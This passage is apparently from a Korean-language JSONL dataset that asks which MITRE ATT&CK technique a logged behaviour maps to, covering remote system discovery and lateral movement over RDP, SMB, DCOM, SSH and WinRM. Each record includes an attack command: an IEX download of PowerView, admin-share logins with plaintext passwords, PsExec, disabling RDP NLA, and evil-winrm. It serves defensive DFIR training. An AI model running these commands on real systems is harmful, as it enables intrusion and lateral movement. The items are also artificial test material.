$name = $Computer.Properties.name; if ($name) { Write-Host $name } }", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-11_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] ActiveDirectory PowerShell 모듈의 Get-ADComputer cmdlet을 사용해 도메인 내 모든 컴퓨터 객체를 나열한다.\n[절차] ActiveDirectory 모듈이 설치 및 Import 되어 있는지 확인한다. PowerShell에서 Get-ADComputer -Filter * 명령을 실행한다. 출력 결과를 통해 컴퓨터 이름, DN 등 AD 상의 경로 정보를 확인한다.\n[대표 명령 예시]\nGet-ADComputer -Filter *", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-12_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] PowerShell의 [adsisearcher] 타입 가속기를 사용해 AD에서 objectcategory=computer 필터로 컴퓨터 객체를 열거한다.\n[절차] PowerShell 콘솔을 연다. \"([adsisearcher]\"objectcategory=computer\").FindAll()\" 명령을 실행한다. 추가로 FindOne()을 사용해 단일 결과를 확인할 수 있다.\n[대표 명령 예시]\n([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-13_Q13", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] PowerSploit의 PowerView 모듈을 메모리 상에 로드한 후 Get-DomainController 함수를 사용해 도메인 컨트롤러 정보를 수집한다.\n[절차] 인터넷에서 PowerView.ps1 스크립트를 다운로드해 IEX로 메모리 로드한다. Get-DomainController -Verbose 명령을 실행해 도메인 컨트롤러 정보를 조회한다. 결과를 분석해 도메인 컨트롤러의 이름, IP, 도메인 정보를 파악한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -Verbose", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-14_Q14", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] get-wmiobject를 사용해 root\\directory\\ldap 네임스페이스에서 ds_computer 클래스를 질의한다. 이를 통해 AD 내 시스템 목록(특히 DC)을 열거할 수 있다.\n[절차] PowerShell에서 get-wmiobject -class ds_computer -namespace root\\directory\\ldap 명령을 실행한다. 오류 발생 시 예외 코드를 확인해 권한/연결 문제를 진단한다. 정상 실행 시 결과에 포함된 시스템 및 도메인 컨트롤러 정보를 분석한다.\n[대표 명령 예시]\ntry { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop } catch { $_; exit $_.Exception.HResult }", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-15_Q15", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] net.exe를 사용해 도메인 내 \"Domain Controllers\" 그룹 구성원을 조회한다. 도메인 컨트롤러 목록을 간단히 확인하는 정찰 기법이다.\n[절차] cmd.exe를 실행한다. net group /domain \"Domain Controllers\" 명령을 실행한다. 결과에 표시된 도메인 컨트롤러 이름을 기반으로 추가 공격 경로를 계획한다.\n[대표 명령 예시]\nnet group /domain \"Domain controllers\"", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1018_T1018-16_Q16", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1018 Remote System Discovery (Tactic: Discovery)\n[요약] SoftPerfect NetScan 포터블 버전을 사용해 지정된 IP 범위에 대해 스캔을 수행한다. UI 없이 /auto 옵션을 사용해 결과를 파일로 저장하는 방식이다.\n[절차] 지정된 경로에 Netscan 포터블 압축 파일을 다운로드하고 압축을 해제한다. netscan.exe 경로와 스캔할 IP 범위를 설정한다(예: 127.0.0.1-127.0.0.1). 커맨드라인에서 /hide /auto /range 옵션을 사용해 스캔을 실행한다. 생성된 결과 파일(T1018NetscanOutput.txt)을 열어 활성 호스트와 포트 정보를 분석한다.\n[대표 명령 예시]\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\netscan\\64-bit\\netscan.exe\" /hide /auto:\"$env:TEMP\\T1018NetscanOutput.txt\" /range:127.0.0.1-127.0.0.1", "answer": "이 행위는 MITRE ATT&CK의 T1018 \"Remote System Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.001_T1021.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.001 Remote Services: Remote Desktop Protocol (Tactic: Lateral Movement)\n[요약] 도메인에 조인된 호스트에서 현재 로그온 서버(도메인 컨트롤러)에 RDP 세션을 시도한다. cmdkey로 자격 증명을 미리 저장한 뒤 mstsc를 통해 RDP 접속을 수행하는 시나리오이다.\n[절차] 테스트 호스트가 도메인에 조인되어 있는지 확인한다. 환경 변수에서 도메인 이름(USERDOMAIN), 사용자 이름(USERNAME), 로그온 서버(LOGONSERVER)를 가져온다. cmdkey /generic:TERMSRV/<Server> /user:<Domain\\User> /pass:<Password> 명령으로 RDP용 자격 증명을 저장한다. mstsc /v:<Server> 명령을 실행해 도메인 컨트롤러에 RDP 연결을 시도한다. 테스트 종료 후 mstsc 프로세스를 종료해 세션을 정리한다.\n[대표 명령 예시]\n$Server = $ENV:LOGONSERVER.TrimStart('\\'); $User = Join-Path $Env:USERDOMAIN $ENV:USERNAME; $Password = '1password2!'; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server", "answer": "이 행위는 MITRE ATT&CK의 T1021.001 \"Remote Services: Remote Desktop Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.001_T1021.001-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.001 Remote Services: Remote Desktop Protocol (Tactic: Lateral Movement)\n[요약] PowerShell을 사용해 RDP 리스닝 포트를 기본값(3389)에서 비표준 포트(예: 4489)로 변경하고, 해당 포트를 허용하는 방화벽 규칙을 생성한다. 포트 기반 탐지를 우회하려는 시나리오를 모사한다.\n[절차] 관리자 권한 PowerShell 세션을 연다. HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp 레지스트리 키의 PortNumber 값을 새 포트 번호(예: 4489)로 설정한다. New-NetFirewallRule를 사용해 새 포트에 대한 인바운드 TCP 허용 규칙 'RDPPORTLatest-TCP-In'을 생성한다. 필요 시 TermService(원격 데스크톱 서비스)를 재시작해 변경 사항을 적용한다.\n[대표 명령 예시]\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name 'PortNumber' -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489", "answer": "이 행위는 MITRE ATT&CK의 T1021.001 \"Remote Services: Remote Desktop Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.001_T1021.001-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.001 Remote Services: Remote Desktop Protocol (Tactic: Lateral Movement)\n[요약] 명령 프롬프트에서 reg와 netsh를 이용해 RDP 리스닝 포트를 변경하고 새 포트를 허용하는 방화벽 규칙을 추가한다. 동일한 설정 변경을 GUI 없이 레지스트리/방화벽 명령으로 수행하는 패턴이다.\n[절차] 관리자 권한 cmd.exe를 실행한다. reg add 명령으로 HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp의 PortNumber 값을 새 포트(예: 4489)로 설정한다. netsh advfirewall firewall add rule 명령으로 새 포트를 허용하는 인바운드 규칙 'RDPPORTLatest-TCP-In'을 추가한다. 테스트 후에는 레지스트리 값을 원래 포트로 되돌리고 방화벽 규칙을 삭제하며 TermService를 재시작한다.\n[대표 명령 예시]\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489", "answer": "이 행위는 MITRE ATT&CK의 T1021.001 \"Remote Services: Remote Desktop Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.001_T1021.001-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.001 Remote Services: Remote Desktop Protocol (Tactic: Lateral Movement)\n[요약] 레지스트리의 UserAuthentication 값을 변경해 RDP의 네트워크 수준 인증(NLA)을 비활성화한다. 이를 통해 인증 이전 단계에서 로그인 화면에 직접 접근할 수 있어 공격 표면이 넓어진다.\n[절차] 관리자 권한 cmd.exe를 실행한다. reg add 명령으로 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp 키의 UserAuthentication 값을 0으로 설정한다. 이후 RDP 접속 시 NLA 없이 로그인 화면에 접근 가능한 상태가 되는지 확인한다. 테스트 종료 후에는 UserAuthentication 값을 원래 값(기본 1)으로 복원한다.\n[대표 명령 예시]\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f", "answer": "이 행위는 MITRE ATT&CK의 T1021.001 \"Remote Services: Remote Desktop Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.002_T1021.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.002 Remote Services: SMB/Windows Admin Shares (Tactic: Lateral Movement)\n[요약] net use 명령을 사용해 원격 호스트의 관리 공유(C$, ADMIN$ 등)에 인증 후 연결하는 시나리오다. 도메인\\Administrator 계정과 비밀번호를 이용해 \\Target\\C$ 공유를 매핑해, 원격 파일 시스템에 직접 접근하는 패턴을 모사한다.\n[절차] 공격자가 사용할 도메인 계정(DOMAIN\\Administrator)과 비밀번호를 준비한다. 대상 호스트 이름(또는 IP)과 접근할 관리 공유 이름(C$, ADMIN$ 등)을 결정한다. cmd.exe에서 net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator 명령을 실행하여 관리 공유에 연결한다. 연결 성공 시 파일 탐색기 또는 명령줄에서 \\\\Target\\C$ 경로를 통해 원격 C: 드라이브에 접근할 수 있다.\n[대표 명령 예시]\ncmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\"", "answer": "이 행위는 MITRE ATT&CK의 T1021.002 \"Remote Services: SMB/Windows Admin Shares\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.002_T1021.002-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.002 Remote Services: SMB/Windows Admin Shares (Tactic: Lateral Movement)\n[요약] PowerShell의 New-PSDrive를 사용해 원격 관리 공유를 로컬 드라이브 문자(g:)로 매핑한다. 이후 g:\\ 경로를 통해 원격 C$에 직접 파일을 복사하고 실행할 수 있는 상황을 만든다.\n[절차] 대상 호스트 이름(예: Target)과 관리 공유 이름(C$, ADMIN$ 등)을 정한다. PowerShell 세션을 연다. New-PSDrive -Name g -PSProvider FileSystem -Root \\\\Target\\C$ 명령을 실행한다. 성공 시 g: 드라이브를 통해 원격 시스템의 C: 내용을 탐색할 수 있다.\n[대표 명령 예시]\nNew-PSDrive -Name g -PSProvider FileSystem -Root \\\\Target\\C$", "answer": "이 행위는 MITRE ATT&CK의 T1021.002 \"Remote Services: SMB/Windows Admin Shares\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.002_T1021.002-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.002 Remote Services: SMB/Windows Admin Shares (Tactic: Lateral Movement)\n[요약] Sysinternals PsExec 도구를 이용해 원격 호스트의 ADMIN$ 공유로 파일을 복사하고, 서비스 형태로 원격에서 실행한다. 에이전트 없는 원격 코드 실행 및 측면 이동에 자주 사용되는 패턴을 재현한다.\n[절차] Sysinternals에서 PsExec.exe를 다운로드해 로컬 디스크에 배치한다. 원격 실행할 바이너리 경로(예: C:\\\\Windows\\\\System32\\\\cmd.exe)와 대상 호스트(\\\\localhost, \\\\Server 등)를 정한다. cmd.exe 또는 PowerShell에서 PsExec.exe \\\\localhost -accepteula -c C:\\\\Windows\\\\System32\\\\cmd.exe 명령을 실행한다. PsExec는 원격 ADMIN$ 공유를 통해 psexesvc 서비스를 생성하고, 지정한 바이너리를 원격에서 실행한다. 원격 실행 완료 후 psexesvc 서비스와 관련 파일을 제거해 흔적을 줄일 수 있다.\n[대표 명령 예시]\nC:\\\\Tools\\\\PsExec.exe \\\\localhost -accepteula -c C:\\\\Windows\\\\System32\\\\cmd.exe", "answer": "이 행위는 MITRE ATT&CK의 T1021.002 \"Remote Services: SMB/Windows Admin Shares\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.002_T1021.002-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.002 Remote Services: SMB/Windows Admin Shares (Tactic: Lateral Movement)\n[요약] cmd.exe에서 로컬 Admin Share(\\\\127.0.0.1\\ADMIN$)로 명령 결과를 직접 리다이렉트하여 파일 출력하는 기법이다. 포스트 익스플로잇 프레임워크에서 원격 명령의 출력 결과를 관리자 공유로 회수할 때 사용되는 패턴과 유사하다.\n[절차] 관리자 권한 cmd.exe를 실행한다. hostname 또는 기타 시스템 명령을 선택한다. cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1 명령을 실행한다. 명령의 표준 출력 및 표준 오류가 C:\\\\Windows (ADMIN$ 루트)에 output.txt 파일로 기록된다. 테스트 후 output.txt 파일을 확인하거나 삭제한다.\n[대표 명령 예시]\ncmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1", "answer": "이 행위는 MITRE ATT&CK의 T1021.002 \"Remote Services: SMB/Windows Admin Shares\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.003_T1021.003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.003 Remote Services: Distributed Component Object Model (DCOM) (Tactic: Lateral Movement)\n[요약] MMC20.application COM 객체를 DCOM으로 원격 생성해, ActiveView.ExecuteShellCommand를 통해 원격 시스템에서 calc.exe를 실행하는 측면 이동 시나리오이다. 별도 에이전트 없이 COM 호출만으로 원격 프로세스를 띄우는 패턴을 재현한다.\n[절차] 목표 시스템의 호스트 이름 또는 IP(예: localhost, DC01)를 파악한다. PowerShell에서 [activator]::CreateInstance를 사용해 'MMC20.application' ProgID의 COM 객체를 원격 시스템 상에서 생성한다. 생성된 MMC 문서의 ActiveView.ExecuteShellCommand 메서드를 호출하여 'c:\\\\windows\\\\system32\\\\calc.exe'를 실행한다. 성공 시 대상 호스트에서 calc.exe 프로세스가 GUI 형태로 실행된다.\n[대표 명령 예시]\n[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application','localhost')).Document.ActiveView.ExecuteShellCommand('c:\\\\windows\\\\system32\\\\calc.exe', $null, $null, '7')", "answer": "이 행위는 MITRE ATT&CK의 T1021.003 \"Remote Services: Distributed Component Object Model (DCOM)\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.003_T1021.003-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.003 Remote Services: Distributed Component Object Model (DCOM) (Tactic: Lateral Movement)\n[요약] Excel.Application COM 객체를 DCOM으로 원격 생성하고, ActivateMicrosoftApp 메서드를 악용해 foxprow.exe로 위장한 calc.exe를 실행하는 측면 이동 기법이다. 미리 대상 사용자 경로에 바이너리를 복사한 뒤, Excel COM 호출만으로 원격 실행을 유도한다.\n[절차] 대상 사용자 계정 이름(예: admin)과 대상 호스트 이름 또는 IP(예: localhost)를 결정한다. 로컬 또는 공유 경로에서 c:\\\\windows\\\\system32\\\\calc.exe를 C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe로 복사한다(테스트에서는 로컬 경로 기준). PowerShell에서 [System.Activator]::CreateInstance를 사용해 'Excel.Application' ProgID의 COM 객체를 원격 시스템에서 생성한다. 생성된 Excel COM 객체에 대해 ActivateMicrosoftApp('5')를 호출해 특정 애플리케이션을 실행하게 한다(foxprow.exe가 연계될 수 있는 시나리오). 성공 시 원격 대상 시스템에서 foxprow.exe(실제 calc.exe)가 실행된다.\n[대표 명령 예시]\ncopy c:\\\\windows\\\\system32\\\\calc.exe 'C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe'; $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('Excel.Application','localhost')); $com.ActivateMicrosoftApp('5')", "answer": "이 행위는 MITRE ATT&CK의 T1021.003 \"Remote Services: Distributed Component Object Model (DCOM)\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.004_T1021.004-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.004 Remote Services: SSH (Tactic: Lateral Movement)\n[요약] Windows에서 VMware PowerCLI 모듈을 사용해 ESXi 호스트에 접속하고, 관리 서비스 목록에서 TSM-SSH 서비스를 찾아 시작한다. 이를 통해 원래 비활성화되어 있던 ESXi SSH 서비스를 원격에서 활성화하는 시나리오를 재현한다.\n[절차] 테스트에 사용할 ESXi 호스트 주소(vm_host), 계정(vm_user), 비밀번호(vm_pass)를 확인한다. PowerShell에서 VMware.PowerCLI 모듈을 로드하고, 인증서 경고/CEIP 설정을 비대화형 모드에 맞게 조정한다. Connect-VIServer 명령으로 ESXi 호스트에 접속한다. Get-VMHostService -VMHost <vm_host> 결과 중 Key가 'TSM-SSH'인 서비스를 찾는다. Start-VMHostService -Confirm:$false를 호출하여 TSM-SSH(SSH 서비스)를 시작한다.\n[대표 명령 예시]\nSet-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false; Connect-VIServer -Server <vm_host> -User <vm_user> -Password <vm_pass>; Get-VMHostService -VMHost <vm_host> | Where-Object { $_.Key -eq 'TSM-SSH' } | Start-VMHostService -Confirm:$false", "answer": "이 행위는 MITRE ATT&CK의 T1021.004 \"Remote Services: SSH\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.004_T1021.004-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.004 Remote Services: SSH (Tactic: Lateral Movement)\n[요약] Windows에서 plink(putty CLI)를 사용해 ESXi 호스트에 SSH로 접속한 뒤, vim-cmd hostsvc/enable_ssh 명령을 실행해 SSH 서비스를 활성화한다. 별도 PowerCLI 없이도 단순 SSH 클라이언트만으로 ESXi 관리 인터페이스를 여는 패턴을 재현한다.\n[절차] 테스트에 사용할 ESXi 호스트 주소(vm_host), root 계정(vm_user) 및 비밀번호(vm_pass)를 정한다. Windows 시스템에 plink.exe를 준비하고 경로(plink_file)를 확인한다. PowerShell 또는 CMD에서 plink.exe -ssh -l <vm_user> -pw <vm_pass> <vm_host> 명령을 통해 비대화형 SSH 세션을 열 준비를 한다. 표준 입력(echo \"\")을 파이프로 연결하고, 원격 명령으로 'vim-cmd hostsvc/enable_ssh'를 실행하여 ESXi SSH 서비스를 활성화한다. 성공 시 ESXi 호스트의 TSM-SSH 서비스가 활성화되고, 이후 SSH를 통한 상시 접속이 가능해진다.\n[대표 명령 예시]\necho \"\" | <plink_file> -batch <vm_host> -ssh -l <vm_user> -pw \"<vm_pass>\" \"vim-cmd hostsvc/enable_ssh\"", "answer": "이 행위는 MITRE ATT&CK의 T1021.004 \"Remote Services: SSH\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.006_T1021.006-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.006 Remote Services: Windows Remote Management (Tactic: Lateral Movement)\n[요약] 로컬 시스템에서 Enable-PSRemoting -Force 명령을 실행해 WinRM과 PowerShell Remoting을 활성화하는 시나리오이다. 이를 통해 이후 원격 PowerShell 세션을 생성할 수 있는 기반을 마련한다.\n[절차] 관리자 권한 PowerShell 콘솔을 연다. Enable-PSRemoting -Force 명령을 실행해 WinRM 서비스를 구성하고 필요 시 방화벽 규칙을 자동 생성한다. 구성이 완료되면 WinRM 서비스가 실행 중이며, PowerShell Remoting이 허용된 상태가 된다.\n[대표 명령 예시]\nEnable-PSRemoting -Force", "answer": "이 행위는 MITRE ATT&CK의 T1021.006 \"Remote Services: Windows Remote Management\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.006_T1021.006-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.006 Remote Services: Windows Remote Management (Tactic: Lateral Movement)\n[요약] 로컬 시스템에서 WinRM을 활성화한 뒤, Invoke-Command를 이용해 자기 자신($env:COMPUTERNAME)을 원격 대상처럼 지정하고 whoami 명령을 실행하는 테스트이다. 실제로는 동일 호스트지만, PowerShell Remoting을 이용한 코드 실행 흐름을 재현한다.\n[절차] 관리자 권한 PowerShell 세션을 연다. Enable-PSRemoting -Force 명령으로 WinRM과 PowerShell Remoting을 활성화한다. Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock { whoami } 를 실행하여 원격 코드 실행 흐름을 로컬에서 시뮬레이션한다. 명령 실행 후 Disable-PSRemoting -Force 명령으로 WinRM 및 Remoting 설정을 비활성화한다(테스트 스크립트에 포함됨).\n[대표 명령 예시]\nEnable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock { whoami }; Disable-PSRemoting -Force", "answer": "이 행위는 MITRE ATT&CK의 T1021.006 \"Remote Services: Windows Remote Management\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Lateral Movement이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1021.006_T1021.006-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1021.006 Remote Services: Windows Remote Management (Tactic: Lateral Movement)\n[요약] Evil-WinRM 도구를 사용해 WinRM이 활성화된 원격 Windows 시스템에 접속하는 시나리오를 모사한다. 공격자는 유효한 도메인 계정과 비밀번호를 사용하여 evil-winrm -i <host> -u <user> -p <password> 명령으로 원격 명령 실행 콘솔을 획득할 수 있다.\n[절차] 테스트용 Windows 시스템에 Ruby 런타임을 설치한다(예: rubyinstaller를 사용). gem install evil-winrm 명령으로 Evil-WinRM Ruby Gem을 설치한다. 대상 시스템(destination_address)에서 WinRM(HTTP/HTTPS)이 활성화되어 있고, 입력한 계정(user_name, password)이 원격 접속 권한을 가지고 있는지 확인한다. PowerShell 또는 CMD에서 evil-winrm -i <destination_address> -u <user_name> -p <password> 를 실행해 원격 WinRM 세션을 연다. 세션 내에서 명령 실행, 파일 업로드/다운로드 등 추가적인 측면 이동 활동을 수행할 수 있다.\n[대표 명령 예시]\nevil-winrm -i <destination_address> -u <user_name> -p <password>", "answer": "이 행위는 MITRE 